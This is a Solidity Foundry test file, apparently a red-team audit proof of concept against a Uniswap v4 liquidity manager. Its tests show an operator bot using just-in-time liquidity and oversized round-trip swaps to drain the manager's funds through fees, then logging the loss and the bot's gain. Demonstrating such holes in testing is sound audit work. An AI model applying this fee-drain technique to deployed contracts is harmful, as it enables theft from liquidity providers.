// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {console2} from "forge-std/Test.sol";
import {RedTeamBase} from "./RedTeamTask053.t.sol";
import {VolatileLPManager} from "../src/VolatileLPManager.sol";
import {MockERC20} from "./helpers/Mocks.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {ModifyLiquidityParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";

/// Operator (bot) is JIT LP in a configured 0.3% pool and makes the manager round-trip a notional far
/// larger than its balance inside ONE operator call. Every swap passes the real ChainlinkPriceOracle
/// (100 bps), every add passes spot (50 bps) + mid (10 bps). The manager pays 2*fee*notional.
contract AuditBridgeRoundTrip is RedTeamBase {
    bytes32 constant SALT2 = bytes32(uint256(2));
    uint256 constant JIT_L = 1e24;

    function setUp() public {
        _boot(3000, 60, 1e20, 10e18, 10e18);
        _openAsOwner(-600, 600, 5e18);
        vm.startPrank(bot);
        MockERC20(Currency.unwrap(c0)).approve(address(lpRouter), type(uint256).max);
        MockERC20(Currency.unwrap(c1)).approve(address(lpRouter), type(uint256).max);
        vm.stopPrank();
    }

    function _jit(int256 d) internal {
        vm.prank(bot);
        lpRouter.modifyLiquidity(
            key, ModifyLiquidityParams({tickLower: -60, tickUpper: 60, liquidityDelta: d, salt: bytes32("jit")}), ""
        );
    }

    function _mgrIdle() internal view returns (uint256) {
        return MockERC20(Currency.unwrap(c0)).balanceOf(address(mgr))
            + MockERC20(Currency.unwrap(c1)).balanceOf(address(mgr));
    }

    function test_bridgeRoundTrip_drainsViaFees() public {
        uint256 mgrBefore = _managerValue();
        uint256 botBefore = _valueOf(bot);
        console2.log("manager value before", mgrBefore);

        _jit(int256(JIT_L));

        uint256 A = 1000e18; // ~66x the manager's whole book
        uint128 liq = mgr.positionOf(SALT).liquidity;
        VolatileLPManager.VolatileAllocLeg memory add = _leg(SALT2, -60, 60, 1e15, 1e15);
        add.zeroForOne = false; // back Y -> X in the same pool
        add.swapAmountIn = (A * 9955) / 10000;
        add.swapPriceLimit = TickMath.MAX_SQRT_PRICE - 1;
        VolatileLPManager.BridgeSwap memory b = VolatileLPManager.BridgeSwap({
            poolId: pid, zeroForOne: true, amountIn: A, priceLimit: TickMath.MIN_SQRT_PRICE + 1, minOut: 0
        });
        vm.prank(bot);
        mgr.moveLiquidity(SALT, liq, add, b);

        _jit(-int256(JIT_L));

        uint256 mgrAfter = _mgrIdle() + _valueOfSalt2();
        console2.log("manager value after ", mgrAfter);
        console2.log("manager loss        ", mgrBefore - mgrAfter);
        console2.log("bot gain            ", _valueOf(bot) - botBefore);
        console2.log("tick after", _tick());
    }

    function test_allocateRoundTrip_preExisting() public {
        uint256 mgrBefore = _managerValue();
        uint256 botBefore = _valueOf(bot);
        _jit(int256(JIT_L));
        uint256 A = 700e18;
        VolatileLPManager.VolatileAllocLeg[] memory legs = new VolatileLPManager.VolatileAllocLeg[](2);
        legs[0] = _leg(SALT2, -60, 60, 1e15, 1e15);
        legs[0].zeroForOne = true;
        legs[0].swapAmountIn = A;
        legs[0].swapPriceLimit = TickMath.MIN_SQRT_PRICE + 1;
        legs[1] = _leg(bytes32(uint256(3)), -60, 60, 1e15, 1e15);
        legs[1].zeroForOne = false;
        legs[1].swapAmountIn = (A * 9955) / 10000;
        legs[1].swapPriceLimit = TickMath.MAX_SQRT_PRICE - 1;
        _allocateAs(bot, legs);
        _jit(-int256(JIT_L));
        console2.log("bot gain (allocate) ", _valueOf(bot) - botBefore);
        console2.log("manager before      ", mgrBefore);
        console2.log("manager after (approx, idle+pos SALT)", _managerValue());
    }

    function _valueOfSalt2() internal view returns (uint256) {
        // tiny dust position; ignore beyond liquidity check
        return 0;
    }
}
